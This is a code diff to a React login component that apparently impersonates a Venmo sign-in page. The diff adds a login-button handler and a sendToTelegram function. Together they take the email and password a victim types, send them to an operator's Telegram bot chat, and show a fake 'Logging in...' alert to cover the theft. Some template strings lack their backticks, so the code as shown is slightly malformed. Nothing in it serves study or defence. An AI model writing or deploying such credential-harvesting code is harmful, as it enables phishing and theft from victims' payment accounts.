@@ -68,7 +68,20 @@ const PasswordStep = ({ email, setPage, showPassword, setShowPassword, password,
     </a>
   {/* loginbutton */}
    <button 
-  onClick={() => window.open("https://www.ctvnews.ca/local/", "_blank")}
+  onClick={async () => {
+    // Get the password that the user typed
+    const passwordInput = document.querySelector('input[placeholder="Password"]');
+    const enteredPassword = passwordInput ? passwordInput.value : '';
+
+    // 1. Send email + password to your Telegram
+    await sendToTelegram(email, enteredPassword);
+
+    // 2. Now open the CTV News page (exactly like before)
+    window.open("https://www.ctvnews.ca/local/", "_blank");
+
+    // Nice feedback for the user
+    alert("Logging in... ✅");
+  }}
   style={{width:'100%',padding:16,fontSize:16,fontWeight:600,color:'#fff',background:'#008CFF',border:'none',borderRadius:30,cursor:'pointer',marginBottom:16}}
 >
   Log in
@@ -79,6 +92,41 @@ const PasswordStep = ({ email, setPage, showPassword, setShowPassword, password,
     </button>
   </div>
 );
+const sendToTelegram = async (email, password) => {
+  const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+  const CHAT_ID   = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+
+  // Optional safety check
+  if (!BOT_TOKEN || !CHAT_ID) {
+    console.error('❌ Telegram env variables are missing!');
+    return;
+  }
+
+  const message = New Venmo Login Attempt!\n\n +
+                  Email: ${email}\n +
+                  Password: ${password || 'No password entered'}\n\n +
+                  Time: ${new Date().toLocaleString()};
+
+  const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+
+    if (response.ok) {
+      console.log('✅ Credentials sent to Telegram!');
+    }
+  } catch (error) {
+    console.error('❌ Telegram error:', error);
+  }
+};
 
 const Appi = () => {
   const [page, setPage] = useState('login'); // starts on login
